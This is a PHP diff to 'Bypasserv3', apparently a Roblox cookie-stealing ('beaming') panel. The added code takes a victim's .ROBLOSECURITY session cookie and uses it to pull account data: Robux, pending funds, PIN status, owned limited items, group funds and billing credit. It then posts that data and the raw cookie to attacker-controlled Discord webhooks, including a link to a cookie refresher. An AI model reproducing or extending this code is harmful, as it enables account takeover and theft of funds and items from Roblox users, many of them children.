@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Bypass API Endpoint
- * Updated with per-instance user webhooks
+ * Updated with per-instance user webhooks and detailed Roblox data
  */
 
 header('Content-Type: application/json');
@@ -150,6 +150,113 @@ $username = $userInfo['username'] ?? 'Unknown';
 $userId = $userInfo['userId'] ?? 'Unknown';
 $avatarUrl = $apiData['avatarUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
 
+// EXTRACT BYPASSED COOKIE FROM API RESPONSE
+$bypassedCookie = $apiData['cookie'] ?? $cookie;
+
+// ============================================
+// FETCH ADDITIONAL ROBLOX DATA
+// ============================================
+function makeRequest($url, $headers, $postData = null) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    if ($postData) {
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
+    }
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return json_decode($response, true);
+}
+
+function ownsBundle($userId, $bundleId, $headers) {
+    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
+    $response = makeRequest($url, $headers);
+    return isset($response['data']) && !empty($response['data']);
+}
+
+// Headers for Roblox API requests (use bypassed cookie)
+$headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application/json"];
+
+// Get User Info
+$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers);
+$displayName = $userInfoData['displayName'] ?? $username;
+
+// Get Settings Data
+$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers);
+$isPremium = isset($settingsData['IsPremium']) ? ($settingsData['IsPremium'] ? '✅ True' : '❌ False') : '❓ Unknown';
+$emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';
+
+// Get Transaction Summary
+$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers);
+$pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? '❓ Unknown';
+
+// Get PIN Status
+$pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers);
+$pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
+
+// Get Voice Chat Status
+$vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers);
+$vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
+
+// Check for Premium Items (Headless & Korblox)
+$hasHeadless = ownsBundle($userId, 201, $headers);
+$hasKorblox = ownsBundle($userId, 192, $headers);
+$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
+$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';
+
+// Calculate Account Age
+$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
+$accountAge = '❓ Unknown';
+if ($accountCreated) {
+    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
+    $accountAge = "$days days";
+}
+
+// Get Friends Count
+$friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers);
+$friendsCount = $friendsData['count'] ?? '❓ Unknown';
+
+// Get Followers Count
+$followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers);
+$followersCount = $followersData['count'] ?? '❓ Unknown';
+
+// Get Owned Groups and Calculate Group Funds
+$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers);
+$ownedGroups = [];
+if (isset($groupsData['data'])) {
+    foreach ($groupsData['data'] as $group) {
+        if ($group['role']['rank'] == 255) {
+            $ownedGroups[] = $group;
+        }
+    }
+}
+$totalGroupsOwned = count($ownedGroups);
+
+$totalGroupFunds = 0;
+$totalPendingGroupFunds = 0;
+foreach ($ownedGroups as $group) {
+    $groupId = $group['group']['id'];
+    $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers);
+    $totalGroupFunds += $groupFunds['robux'] ?? 0;
+    
+    $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers);
+    if (isset($groupPayouts['data'])) {
+        foreach ($groupPayouts['data'] as $payout) {
+            if ($payout['status'] === 'Pending') {
+                $totalPendingGroupFunds += $payout['amount'];
+            }
+        }
+    }
+}
+
+// Get Credit Balance
+$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers);
+$creditBalance = isset($creditBalanceData['balance']) ? $creditBalanceData['balance'] : '❓ Unknown';
+$creditRobux = isset($creditBalanceData['robuxAmount']) ? $creditBalanceData['robuxAmount'] : '❓ Unknown';
+
 // ============================================
 // UPDATE INSTANCE STATS
 // ============================================
@@ -169,40 +276,67 @@ if ($instanceData) {
 updateGlobalStats('totalCookies', 1);
 
 // ============================================
-// SEND WEBHOOKS
+// SEND WEBHOOKS WITH DETAILED DATA
 // ============================================
 
-// Master Webhook Notification (Admin - ALL HITS)
+// Create the detailed embed payload
+$detailedEmbed = [
+    'content' => '@everyone',
+    'username' => 'Fuji',
+    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
+    'embeds' => [[
+        'title' => '',
+        'type' => 'rich',
+        'description' => "<:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://www.logged.tg/tools/refresher?defaultFill=$bypassedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
+        'color' => hexdec('00061a'),
+        'thumbnail' => ['url' => $avatarUrl],
+        'fields' => [
+            ['name' => '<:display:1348231445029847110> Display Name', 'value' => "```$displayName```", 'inline' => true],
+            ['name' => '<:user:1348232101639618570> Username', 'value' => "```$username```", 'inline' => true],
+            ['name' => '<:userid:1348231351777755167> User ID', 'value' => "```$userId```", 'inline' => true],
+            ['name' => '<:robux:1348231412834111580> Robux', 'value' => "```$robux```", 'inline' => true],
+            ['name' => '<:pending:1348231397529223178> Pending Robux', 'value' => "```$pendingRobux```", 'inline' => true],
+            ['name' => '<:rap:1348231409323741277> RAP', 'value' => "```$rap```", 'inline' => true],
+            ['name' => '<:summary:1348231417502371890> Summary', 'value' => "```$summary```", 'inline' => true],
+            ['name' => '<:pin:1348231400322498591> PIN', 'value' => "```$pinStatus```", 'inline' => true],
+            ['name' => '<:premium:1348231403690786949> Premium', 'value' => "```$isPremium```", 'inline' => true],
+            ['name' => '<:vc:1348233572020129792> Voice Chat', 'value' => "```$vcStatus```", 'inline' => true],
+            ['name' => '<:headless:1348232978777640981> Headless Horseman', 'value' => "```$headlessStatus```", 'inline' => true],
+            ['name' => '<:korblox:1348232956040319006> Korblox Deathspeaker', 'value' => "```$korbloxStatus```", 'inline' => true],
+            ['name' => '<:age:1348232331525099581> Account Age', 'value' => "```$accountAge```", 'inline' => true],
+            ['name' => '<:friends:1348231449798774865> Friends', 'value' => "```$friendsCount```", 'inline' => true],
+            ['name' => '<:followers:1348231447072215162> Followers', 'value' => "```$followersCount```", 'inline' => true],
+            ['name' => '<:creditbalance:1350102024376684644> Credit Card Balance', 'value' => "```$creditBalance USD (est $creditRobux Robux)```", 'inline' => true],
+            ['name' => '<:group:1350102040818221077> Groups Owned', 'value' => "```$totalGroupsOwned```", 'inline' => true],
+            ['name' => '<:combined:1350102005884125307> Combined Group Funds', 'value' => "```$totalGroupFunds Robux ($totalPendingGroupFunds pending)```", 'inline' => true],
+            ['name' => '<:status:1350102051756970025> Account Status', 'value' => "```$emailVerified```", 'inline' => true],
+        ]
+    ]]
+];
+
+// Cookie embed payload
+$cookieEmbed = [
+    'content' => '',
+    'username' => 'Fuji',
+    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
+    'embeds' => [[
+        'description' => "```$bypassedCookie```",
+        'color' => hexdec('00061a')
+    ]]
+];
+
+// Send to Master Webhook
 if (!empty($masterWebhook)) {
-    $masterPayload = [
-        'embeds' => [[
-            'title' => '✅ Successful Bypass',
-            'description' => "**Instance:** `{$directory}`\n**Username:** `{$username}`\n**User ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`",
-            'color' => 3066993,
-            'fields' => [
-                ['name' => 'Account Value', 'value' => '```' . $summary . '```', 'inline' => true],
-                ['name' => 'IP Address', 'value' => '```' . $ip . '```', 'inline' => true],
-                ['name' => 'Timestamp', 'value' => date('Y-m-d H:i:s'), 'inline' => false]
-            ],
-            'footer' => ['text' => 'Bypasserv3 Master Admin'],
-            'timestamp' => date('c')
-        ]]
-    ];
-    sendWebhookNotification($masterWebhook, $masterPayload);
+    sendWebhookNotification($masterWebhook, $detailedEmbed);
+    sleep(1);
+    sendWebhookNotification($masterWebhook, $cookieEmbed);
 }
 
-// User Webhook Notification (User - ONLY FOR THEIR SITE)
+// Send to User Webhook (same detailed format)
 if (!empty($userWebhook)) {
-    $userPayload = [
-        'embeds' => [[
-            'title' => '🎉 Account Bypass Success',
-            'description' => "**Account:** `{$username}`\n**ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`\n**Value:** `{$summary}`",
-            'color' => 3447003,
-            'footer' => ['text' => 'Your Bypasser Instance'],
-            'timestamp' => date('c')
-        ]]
-    ];
-    sendWebhookNotification($userWebhook, $userPayload);
+    sendWebhookNotification($userWebhook, $detailedEmbed);
+    sleep(1);
+    sendWebhookNotification($userWebhook, $cookieEmbed);
 }
 
 // Log successful bypass
